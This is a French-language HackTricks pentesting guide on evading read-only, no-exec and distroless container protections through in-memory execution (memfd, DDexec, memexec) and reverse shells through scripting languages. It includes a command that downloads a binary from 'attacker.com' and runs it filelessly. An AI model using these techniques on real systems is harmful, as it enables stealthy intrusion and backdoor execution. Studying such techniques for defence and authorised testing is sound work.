# Contourner les protections FS : lecture seule / pas d'exécution / Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Vidéos

Dans les vidéos suivantes, vous pouvez trouver les techniques mentionnées sur cette page expliquées plus en profondeur :

- [**DEF CON 31 - Explorer la manipulation de la mémoire Linux pour la furtivité et l'évasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Intrusions furtives avec DDexec-ng & dlopen() en mémoire - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## Scénario lecture seule / pas d'exécution

Il est de plus en plus courant de trouver des machines linux montées avec une **protection du système de fichiers en lecture seule (ro)**, en particulier dans les conteneurs. Cela est dû au fait qu'exécuter un conteneur avec un système de fichiers ro est aussi simple que de définir **`readOnlyRootFilesystem: true`** dans le `securitycontext` :

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Cependant, même si le système de fichiers est monté en tant que ro, **`/dev/shm`** sera toujours inscriptible, donc c'est faux de dire que nous ne pouvons rien écrire sur le disque. Cependant, ce dossier sera **monté avec une protection pas d'exécution**, donc si vous téléchargez un binaire ici, vous **ne pourrez pas l'exécuter**.

> [!WARNING]
> D'un point de vue red team, cela rend **compliqué de télécharger et d'exécuter** des binaires qui ne sont pas déjà dans le système (comme des portes dérobées ou des énumérateurs comme `kubectl`).

## Contournement le plus simple : Scripts

Notez que j'ai mentionné des binaires, vous pouvez **exécuter n'importe quel script** tant que l'interpréteur est présent dans la machine, comme un **script shell** si `sh` est présent ou un **script python** si `python` est installé.

Cependant, cela ne suffit pas pour exécuter votre porte dérobée binaire ou d'autres outils binaires que vous pourriez avoir besoin d'exécuter.

## Contournements en mémoire

Si vous souhaitez exécuter un binaire mais que le système de fichiers ne le permet pas, le meilleur moyen de le faire est de **l'exécuter depuis la mémoire**, car les **protections ne s'appliquent pas là**.

### Contournement FD + syscall exec

Si vous avez des moteurs de script puissants dans la machine, tels que **Python**, **Perl** ou **Ruby**, vous pourriez télécharger le binaire à exécuter depuis la mémoire, le stocker dans un descripteur de fichier mémoire (`create_memfd` syscall), qui ne sera pas protégé par ces protections, puis appeler un **`exec` syscall** en indiquant le **fd comme fichier à exécuter**.

Pour cela, vous pouvez facilement utiliser le projet [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Vous pouvez lui passer un binaire et il générera un script dans le langage indiqué avec le **binaire compressé et encodé en b64** avec les instructions pour **le décoder et le décompresser** dans un **fd** créé en appelant le syscall `create_memfd` et un appel au **syscall exec** pour l'exécuter.

> [!WARNING]
> Cela ne fonctionne pas dans d'autres langages de script comme PHP ou Node car ils n'ont pas de **méthode par défaut pour appeler des syscalls bruts** depuis un script, donc il n'est pas possible d'appeler `create_memfd` pour créer le **fd mémoire** pour stocker le binaire.
>
> De plus, créer un **fd régulier** avec un fichier dans `/dev/shm` ne fonctionnera pas, car vous ne serez pas autorisé à l'exécuter en raison de la **protection pas d'exécution** qui s'appliquera.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) est une technique qui vous permet de **modifier la mémoire de votre propre processus** en écrasant son **`/proc/self/mem`**.

Ainsi, **en contrôlant le code assembleur** qui est exécuté par le processus, vous pouvez écrire un **shellcode** et "muter" le processus pour **exécuter n'importe quel code arbitraire**.

> [!TIP]
> **DDexec / EverythingExec** vous permettra de charger et **d'exécuter** votre propre **shellcode** ou **n'importe quel binaire** depuis **la mémoire**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Pour plus d'informations sur cette technique, consultez le Github ou :

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) est la prochaine étape naturelle de DDexec. C'est un **DDexec shellcode démonisé**, donc chaque fois que vous souhaitez **exécuter un binaire différent**, vous n'avez pas besoin de relancer DDexec, vous pouvez simplement exécuter le shellcode memexec via la technique DDexec et ensuite **communiquer avec ce démon pour passer de nouveaux binaires à charger et exécuter**.

Vous pouvez trouver un exemple sur la façon d'utiliser **memexec pour exécuter des binaires à partir d'un shell PHP inversé** dans [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Avec un objectif similaire à DDexec, la technique [**memdlopen**](https://github.com/arget13/memdlopen) permet une **manière plus facile de charger des binaires** en mémoire pour les exécuter ensuite. Cela pourrait même permettre de charger des binaires avec des dépendances.

## Distroless Bypass

### Qu'est-ce que distroless

Les conteneurs distroless contiennent uniquement les **composants minimaux nécessaires pour exécuter une application ou un service spécifique**, tels que des bibliothèques et des dépendances d'exécution, mais excluent des composants plus volumineux comme un gestionnaire de paquets, un shell ou des utilitaires système.

L'objectif des conteneurs distroless est de **réduire la surface d'attaque des conteneurs en éliminant les composants inutiles** et en minimisant le nombre de vulnérabilités pouvant être exploitées.

### Reverse Shell

Dans un conteneur distroless, vous pourriez **même ne pas trouver `sh` ou `bash`** pour obtenir un shell régulier. Vous ne trouverez également pas de binaires tels que `ls`, `whoami`, `id`... tout ce que vous exécutez habituellement dans un système.

> [!WARNING]
> Par conséquent, vous **ne pourrez pas** obtenir un **reverse shell** ou **énumérer** le système comme vous le faites habituellement.

Cependant, si le conteneur compromis exécute par exemple un web flask, alors python est installé, et donc vous pouvez obtenir un **reverse shell Python**. S'il exécute node, vous pouvez obtenir un shell rev Node, et c'est la même chose avec presque n'importe quel **langage de script**.

> [!TIP]
> En utilisant le langage de script, vous pourriez **énumérer le système** en utilisant les capacités du langage.

S'il n'y a **pas de protections `read-only/no-exec`**, vous pourriez abuser de votre reverse shell pour **écrire dans le système de fichiers vos binaires** et **les exécuter**.

> [!TIP]
> Cependant, dans ce type de conteneurs, ces protections existeront généralement, mais vous pourriez utiliser les **techniques d'exécution en mémoire précédentes pour les contourner**.

Vous pouvez trouver des **exemples** sur la façon d'**exploiter certaines vulnérabilités RCE** pour obtenir des **reverse shells** de langages de script et exécuter des binaires à partir de la mémoire dans [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
